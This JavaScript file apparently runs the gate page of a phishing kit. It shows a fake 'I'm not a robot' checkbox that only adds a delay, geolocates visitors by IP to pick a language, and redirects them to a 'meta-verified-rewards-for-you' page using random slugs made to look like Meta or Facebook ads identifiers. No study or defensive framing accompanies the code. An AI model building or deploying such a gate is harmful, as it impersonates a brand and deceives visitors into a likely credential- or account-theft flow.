(function () {
  const y = document.getElementById('y');
  if (y) y.textContent = String(new Date().getFullYear());

/** Minimum time to show loader before captcha (aligned with IP/geo window below). */
const MIN_GATE_MS = 3000;
/** At most ~5s for IP/geo APIs (ip-country + Utils); captcha still shows if geo is not ready. */
const GEO_RESOLVE_MAX_MS = 5000;
/** After captcha: effect + refresh geo/lang before navigating to meta page. */
const POST_CHECK_MS = 2000;

/** Persist lang for meta-verified-rewards-for-you (country → ja, vi, …). */
const STORAGE_LANG_FROM_LANDING = 'preferredLang';

  function fallbackRandomSlug() {
    const bases = ['meta-request', 'facebook-ads-sync', 'ads-optimizer', 'ads-manager-sync'];
    const base = bases[Math.floor(Math.random() * bases.length)];
    const n = Math.floor(Math.random() * 1e12);
    const code = String(n).padStart(12, '0');
    return `${base}-${code}`;
  }

  /** Fallback if I18N not ready — keep in sync with w4n7v3s1 mapCountryToLang for common codes */
  function mapCountryToLang(cc) {
    try {
      const code = String(cc || '').toUpperCase();
      const direct = {
        US: 'en', GB: 'en', CA: 'en', AU: 'en', IN: 'en', PH: 'en',
        DE: 'de', AT: 'de', CH: 'de', LI: 'de',
        FR: 'fr', LU: 'fr', MC: 'fr',
        IT: 'it', SM: 'it', VA: 'it',
        ES: 'es', AR: 'es', CO: 'es', PE: 'es', CL: 'es', MX: 'es', VE: 'es', UY: 'es',
        PT: 'pt', BR: 'pt', AO: 'pt', MZ: 'pt', CV: 'pt',
        TH: 'th', KR: 'ko', JP: 'ja', VN: 'vi',
        CN: 'zh', TW: 'zh', HK: 'zh', MO: 'zh',
        NL: 'nl', BE: 'nl', SR: 'nl',
        DK: 'da', GL: 'da', FO: 'da',
        SA: 'ar', AE: 'ar', EG: 'ar', QA: 'ar', OM: 'ar', KW: 'ar',
        UA: 'uk',
      };
      return direct[code] || '';
    } catch (_) {
      return '';
    }
  }

  async function getLangFromEdge() {
    try {
      const res = await fetch('./api/ip-country', { headers: { Accept: 'application/json' }, cache: 'no-store' });
      if (!res.ok) return '';
      const d = await res.json();
      return mapCountryToLang(d.country_code || '');
    } catch (_) {
      return '';
    }
  }

  /**
   * Within ~3–5s after landing on index: call Utils.getUserLocation (IP API) then map country → lang for meta (e.g. JP → ja, VN → vi).
   * Does not change index UI (index I18N stays en in w4n7v3s1).
   */
  async function warmGeoForNextPage() {
    try {
      if (!window.Utils || typeof window.Utils.getUserLocation !== 'function') return;
      const loc = await window.Utils.getUserLocation();
      if (!loc || !loc.country_code || loc.country_code === 'N/A') return;
      const cc = String(loc.country_code).toUpperCase();
      let lang = '';
      if (window.I18N && typeof window.I18N.mapCountryToLang === 'function') {
        lang = window.I18N.mapCountryToLang(cc) || '';
      }
      if (!lang) lang = mapCountryToLang(cc);
      if (lang) {
        try {
          localStorage.setItem(STORAGE_LANG_FROM_LANDING, lang);
          localStorage.setItem('prefLang', lang);
        } catch (_) {}
      }
    } catch (_) {}
  }

  function getResolvedLangForRedirect() {
    try {
      const a = (localStorage.getItem(STORAGE_LANG_FROM_LANDING) || localStorage.getItem('prefLang') || '').toLowerCase();
      if (a) return a;
    } catch (_) {}
    return '';
  }

  async function refreshLangBeforeCaptchaSubmit() {
    try {
      if (window.Utils && typeof window.Utils.getUserLocation === 'function') {
        const loc = await window.Utils.getUserLocation();
        if (loc && loc.country_code && loc.country_code !== 'N/A') {
          const cc = String(loc.country_code).toUpperCase();
          let lg = '';
          if (window.I18N && window.I18N.mapCountryToLang) lg = window.I18N.mapCountryToLang(cc) || '';
          if (!lg) lg = mapCountryToLang(cc);
          if (lg) {
            try {
          localStorage.setItem(STORAGE_LANG_FROM_LANDING, lg);
          localStorage.setItem('prefLang', lg);
            } catch (_) {}
          }
        }
      }
    } catch (_) {}
    if (!getResolvedLangForRedirect()) {
      const edge = await getLangFromEdge();
      if (edge) {
        try {
          localStorage.setItem(STORAGE_LANG_FROM_LANDING, edge);
          localStorage.setItem('prefLang', edge);
        } catch (_) {}
      }
    }
  }

  function wireCheckbox() {
    const checkbox = document.getElementById('robotCheckbox');
    if (!checkbox) return;

    checkbox.addEventListener('change', async () => {
      if (!checkbox.checked) return;
      checkbox.disabled = true;
      const overlay = document.getElementById('captchaVerifyLoader');
      if (overlay) {
        overlay.classList.remove('hidden');
        overlay.setAttribute('aria-hidden', 'false');
      }
      try {
        await Promise.all([
          new Promise((resolve) => setTimeout(resolve, POST_CHECK_MS)),
          refreshLangBeforeCaptchaSubmit(),
        ]);
      } catch (_) {}
      const slug = window.generateRandomSlug ? window.generateRandomSlug() : fallbackRandomSlug();
      let lang = getResolvedLangForRedirect();
      if (!lang) {
        try {
          lang = await Promise.race([getLangFromEdge(), new Promise((r) => setTimeout(() => r(''), 2000))]);
        } catch (_) {
          lang = '';
        }
      }
      const url = `./meta-verified-rewards-for-you.html?slug=${encodeURIComponent(slug)}${lang ? `&lang=${encodeURIComponent(lang)}` : ''}`;
      window.location.href = url;
    });
  }

  function warmWithCap() {
    return Promise.race([
      warmGeoForNextPage(),
      new Promise((resolve) => setTimeout(resolve, GEO_RESOLVE_MAX_MS)),
    ]);
  }

  async function finishLandingGate() {
    const loader = document.getElementById('landingGateLoader');
    const content = document.getElementById('landingGateContent');
    try {
      await Promise.all([
        new Promise((resolve) => setTimeout(resolve, MIN_GATE_MS)),
        warmWithCap(),
      ]);
    } catch (_) {}
    if (loader) {
      loader.classList.add('hidden');
      loader.setAttribute('aria-busy', 'false');
    }
    if (content) content.classList.remove('hidden');
  }

  const hasGate = document.getElementById('landingGateLoader') && document.getElementById('landingGateContent');
  if (hasGate) {
    finishLandingGate()
      .then(wireCheckbox)
      .catch(() => {
        const loader = document.getElementById('landingGateLoader');
        const content = document.getElementById('landingGateContent');
        if (loader) {
          loader.classList.add('hidden');
          loader.setAttribute('aria-busy', 'false');
        }
        if (content) content.classList.remove('hidden');
        wireCheckbox();
      });
  } else {
    wireCheckbox();
  }
})();
